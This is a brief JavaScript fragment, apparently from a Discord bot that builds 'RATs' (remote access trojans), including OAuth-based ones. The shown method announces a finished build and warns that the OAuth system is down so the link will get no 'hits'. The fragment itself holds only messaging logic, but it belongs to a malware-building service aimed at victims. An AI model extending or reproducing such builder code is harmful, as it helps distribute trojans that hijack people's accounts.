  ...
  finish(rat) {
    return new Promise(async (resolve, reject) => {
      ...
      if (this.ratTypeFormatted.includes("OAuth")){
        ...
        .setTitle("Success! 🎉")
        .setDescription(`Your ${this.ratTypeFormatted} ${type} has been built successfully. \n\nHowever, the OAuth system is down at this moment, so the link won't be able to get any hits. \nApologies for the inconvenience.`)
        .addFields({
